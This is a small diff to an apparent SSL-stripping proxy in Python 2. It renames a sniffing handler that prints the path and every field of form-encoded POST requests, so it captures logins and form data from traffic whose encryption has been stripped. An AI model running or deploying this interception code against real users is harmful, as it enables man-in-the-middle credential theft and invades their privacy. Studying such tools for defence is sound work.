@@ -4,10 +4,10 @@ from SSLStripProxy import SSLStripProxyHandler, test
 import urlparse
 
 class SSLStripSniffProxyHandler(SSLStripProxyHandler):
-    def ssl_request_handler(self, req, body):
+    def save_handler(self, req, reqbody, res, resbody):
         if req.command == 'POST' and req.headers.get('Content-Type').startswith('application/x-www-form-urlencoded'):
             print req.path
-            for k, v in urlparse.parse_qsl(body):
+            for k, v in urlparse.parse_qsl(reqbody):
                 print "  %s: %s" % (k, v)
 
 
